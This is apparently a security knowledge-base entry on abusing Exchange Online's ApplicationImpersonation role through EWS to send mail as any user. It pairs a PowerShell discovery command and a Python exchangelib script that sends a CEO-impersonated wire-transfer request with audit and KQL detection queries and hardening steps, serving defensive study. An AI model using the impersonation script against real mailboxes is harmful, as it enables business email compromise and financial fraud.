# [IA-PHISH-006]: Exchange EWS Impersonation Phishing

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-PHISH-006 |
| **MITRE ATT&CK v18.1** | [Internal Spearphishing (T1534)](https://attack.mitre.org/techniques/T1534/) |
| **Tactic** | Initial Access |
| **Platforms** | M365 / Exchange Online |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Abusing the `ApplicationImpersonation` RBAC role in Exchange Online. An attacker with access to a Service Principal or User Account holding this role can send emails *as* any user in the organization (e.g., the CEO) without knowing their password. This is not "Send As"; this is architectural impersonation where the system treats the request as if it came from the impersonated user.
- **Attack Surface:** Exchange Web Services (EWS) API.
- **Business Impact:** **Perfect Impersonation**. Allows for highly convincing Business Email Compromise (BEC) attacks (e.g., asking Finance to wire money) that are technically indistinguishable from legitimate emails.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User or Service Principal assigned the `ApplicationImpersonation` management role.
- **Vulnerable Config:** Over-permissive Service Accounts (e.g., backup solutions, migration tools) left with this role active.
- **Tools:**
    - [EWS Editor](https://github.com/dseph/EwsEditor)
    - [MailSniper](https://github.com/dafthack/MailSniper)
    - Python `exchangelib`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Discovery**
Check for accounts with Impersonation rights. This usually requires some initial access.

```powershell
Get-ManagementRoleAssignment -Role "ApplicationImpersonation" | Select-Object RoleAssigneeName
```

**Step 2: Exploitation**
Use the `EWS Editor` or a custom script to send mail impersonating the CEO.

```python
# Python snippet using exchangelib
from exchangelib import Credentials, Account, Message, Mailbox, DELEGATE

# Credentials of the account WITH ApplicationImpersonation rights
creds = Credentials('service_account@domain.com', 'password')

# Connect to the target mailbox (CEO)
target_mailbox = 'ceo@domain.com'
account = Account(primary_smtp_address=target_mailbox, credentials=creds, autodiscover=True, access_type=DELEGATE)

# Send email
m = Message(
    account=account,
    subject='Confidential Transfer',
    body='Please process the attached wire instructions immediately.',
    to_recipients=['cfo@domain.com']
)
m.send()
```
*The recipient sees the email coming FROM `ceo@domain.com` with no "on behalf of" flags.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 Exchange Admin Audit Log
Monitor for the assignment of the Impersonation role, which should be rare.
```powershell
Search-UnifiedAuditLog -Operations "New-ManagementRoleAssignment" -ObjectIds "ApplicationImpersonation"
```

#### 5.2 EWS Access Logs (Sentinel)
Detecting the *act* of impersonation is difficult via standard logs, but high volumes of EWS traffic from a single IP/User accessing multiple mailboxes is a strong indicator.

```kusto
// EWS is noisy, focus on single user accessing many others
OfficeActivity
| where RecordType == "ExchangeItem"
| where ClientInfoString has "WebServices"
| summarize TargetCount = dcount(MailboxOwnerUPN) by UserId, IPAddress, TimeGenerated
| where TargetCount > 5
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **RBAC:** Audit all assignments of `ApplicationImpersonation`. Remove it from all non-essential accounts.
*   **Scope:** Use **Management Scopes** to limit *who* can be impersonated. For example, create a scope that excludes "C-Level Executives" and apply the Impersonation role only to that scope.
*   **Modern Auth:** Block Legacy Auth protocols that often facilitate EWS abuse (though EWS supports Modern Auth, older tools rely on Basic).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001] (Compromise of a Service Account)
> **Next Logical Step:** [IA-PHISH-005] (The actual phishing/BEC payload)
